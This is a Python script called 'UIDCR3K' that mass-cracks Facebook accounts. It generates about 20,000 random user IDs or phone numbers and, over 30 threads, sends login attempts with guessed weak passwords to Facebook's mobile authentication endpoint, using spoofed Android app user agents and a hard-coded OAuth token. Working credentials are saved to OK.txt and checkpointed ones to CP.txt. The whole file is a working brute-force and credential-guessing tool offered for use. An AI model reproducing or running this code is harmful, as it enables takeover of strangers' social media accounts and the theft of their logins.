#!/usr/bin/python3
#-*-coding:utf-8-*-


P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'

import os
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	import bs4
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
	os.system('python uidcr3k.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform,uuid
from bs4 import BeautifulSoup as sop



loop = 0
oks = []
cps = []
ugent = []


def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)


def banner():
	os.system("clear")
	print("")
	print("%s    ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓"%(M))
	print("%s   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒"%(M))
	print("%s   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░"%(M))
	print("%s   ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██ "%(M))
	print("%s    ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒"%(M))
	print("%s    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░"%(Z))
	print("%s     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░"%(Z))
	print("%s     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   "%(Z))
	print("%s         ░  ░  ░ ░     ░         ░   "%(Z))
	print("%s             ░                       "%(Z))
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. 𝙀𝙧𝙧𝙤𝙧                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/Azim-Vau  %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/azimvau69       %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s3.0                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sUIDCR3K%s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")

def linex():
	print("%s════════════════════════════════════════════%s\n"%(Z,N))


def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		os.sys.exit()
	else:
		print('\n\n [%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def azimvau():
	os.system('clear')
	banner()
	print(f' {H}[1]RANDOM NUMBER CRACK')
	print(f' {K}[2]RANDOM UID CRACK')
	print(f' {M}[B]BACK\n')
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_uid()
	elif opt =='3':
		azimvau()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def random_uid():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f' {H}EXAMPLE : 123456,1234567,12345678 {N}\n')
	pwx = input(f' {B}PUT PASS : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)

def random_number():
	user=[]
	os.system('clear')
	banner()
	print(f"          {FM}PUT A FULL MOBILE NUMBER{N}\n         {FM}OF ANY COUNTRY AS YOU WISH{N}\n")
	print(f" {M}FOR EXAMPLE : {Z}[{H}+880175803XXXX{Z}]\n")
	fkode = input(f'{K} PUT NUMBER : {H}')
	if len(fkode) < 10:
		xox(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)



def cracker(user,pwx,tl):
	global loop
	global cps
	global oks
	try:
		for pw in pwx:
			ses=requests.Session()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
			gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
			gttt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
			adid = str(uuid.uuid4())
			data = {
				"adid": adid,
				"email": user,
				"password": pw,
				"cpl": "true",
				"credentials_type": "device_based_login_password",
				"source": "device_based_login",
				"error_detail_type": "button_with_disabled",
				"source": "login", "format": "json",
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"locale": "pl_PL", "client_country_code": "PL",
				"device": gtt,
				"device_id": adid,
				"method": "auth.login",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
			}

			head = {
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-sim-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-type": "unknown",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"user-agent": ua_string,
				"x-fb-net-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-bandwidth": str(random.randint(2e7,3e7)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-friendly-name": "authenticate",
				"accept-encoding": "gzip, deflate",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
			result = json.loads(xnxx)
			if "session_key" in result:
				print('\033[1;32m [AZIM-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [AZIM-CP] '+user+'|'+pw+'\033[0;97m')
				open('CP.txt', 'a').write(user+'|'+pw+'\n')
				cps.append(user)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]  \r"),
		sys.stdout.flush()

	except Exception as e:
		pass




if __name__=='__main__':
	azimvau()


